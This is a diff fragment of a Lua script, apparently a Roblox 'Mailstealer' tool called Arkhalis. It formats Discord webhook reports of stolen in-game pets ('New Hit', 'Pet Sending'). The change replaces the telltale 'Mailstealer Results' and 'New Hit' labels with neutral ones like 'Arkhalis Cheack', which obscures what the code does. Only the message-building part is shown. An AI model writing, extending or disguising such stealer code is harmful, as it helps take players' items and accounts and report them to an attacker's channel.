@@ -4,11 +4,11 @@ local webhookcolor = "13369599"
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1106232994441732117/1106233834850222231/33333.png",
-	["content"]= "**🎁New Hit With Arkhalis🎁**",
+	["content"]= "**📨Arkhalis📨**",
 	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
-		["title"]= "`Arkhalis Mailstealer Results`",
+		["title"]= "`Arkhalis Cheack`",
 		["description"]= "**Pet Sending (′ꈍωꈍ‵)**",
 		["url"]= "https://discord.gg/vzY4yAk9ns",
 		["color"]= ""..webhookcolor.."",
